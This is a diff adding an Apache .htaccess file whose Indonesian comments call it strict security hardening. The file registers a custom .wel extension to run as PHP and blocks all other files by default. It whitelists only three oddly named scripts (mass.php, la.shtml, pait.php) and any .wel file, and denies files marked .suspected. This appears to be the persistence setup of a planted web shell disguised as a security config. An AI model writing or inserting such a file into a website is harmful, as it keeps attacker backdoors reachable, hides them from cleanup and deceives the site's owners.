@@ -1,0 +1,43 @@
+# ----------------------------------------------------------------------
+# Konfigurasi Keamanan Ketat + Custom Handler PHP
+# ----------------------------------------------------------------------
+
+# Jangan tampilkan isi direktori
+Options -Indexes
+
+# Handler untuk menjalankan file .wel sebagai PHP
+AddHandler application/x-httpd-php .wel
+AddType application/x-httpd-php .wel
+
+# 1. BLOKIR SEMUA FILE SECARA DEFAULT (Whitelist Method)
+# Menutup akses ke semua file terlebih dahulu demi keamanan maksimal
+<FilesMatch ".*">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# 2. IZINKAN RESOURCE WEB (Case-Insensitive)
+# Menggunakan (?i) agar variasi ekstensi seperti .JPG tetap bisa diakses
+<FilesMatch "(?i)\.(jpg|jpeg|png|gif|css|js|html?|ico|webp)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+# 3. IZINKAN FILE SPESIFIK & EKSTENSI CUSTOM .WEL
+# Di sini kita masukkan file php lama Anda dan mengizinkan semua file .wel
+# (?i) memastikan .WEL, .Wel, atau .wel semuanya diproses
+<FilesMatch "(?i)^(mass\.php|la\.shtml|pait\.php)$|(?i)\.wel$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+# 4. PROTEKSI TAMBAHAN: Blokir file berbahaya/sensitif
+# Meskipun sudah di-whitelist, ini adalah lapisan pertahanan ganda
+<FilesMatch "(?i)\.(cgi|pl|py|pyc|pyo|pcgi|inc|aspx?|bak|test|exe|suspected|env|sh)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Error message custom
+ErrorDocument 403 "<html><head><title>403 Forbidden</title></head><body><center><h1>403 Forbidden</h1><hr>Access Denied</center></body></html>"
+ErrorDocument 404 "<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1><hr>File Not Found</center></body></html>"
